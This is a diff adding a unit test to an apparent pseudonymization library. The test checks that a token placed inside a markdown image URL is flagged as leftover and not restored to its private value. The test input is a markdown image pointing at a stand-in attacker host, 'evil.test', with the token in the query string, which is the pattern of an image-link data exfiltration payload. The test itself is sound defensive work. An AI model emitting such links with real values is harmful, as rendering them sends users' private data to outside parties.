@@ -588,3 +588,12 @@ def test_restore_reports_pseudonyms_it_could_not_account_for():
 
     assert back.replaced_count == 0
     assert back.warnings, "a reply that used none of the tokens must not look complete"
+
+
+def test_restore_reports_a_token_left_in_a_link_target_as_leftover():
+    out = sanitize_stateless(TEXT, mode="token", salt="s")
+    token = next(iter(out.mapping))
+    back = restore_stateless(f"![x](https://evil.test/?q={token})", mapping=out.mapping)
+    assert back.leftover_pseudonyms == [token]
+    assert out.mapping[token] not in back.restored_text
+    assert any(w.startswith("machine_context:") for w in back.warnings)
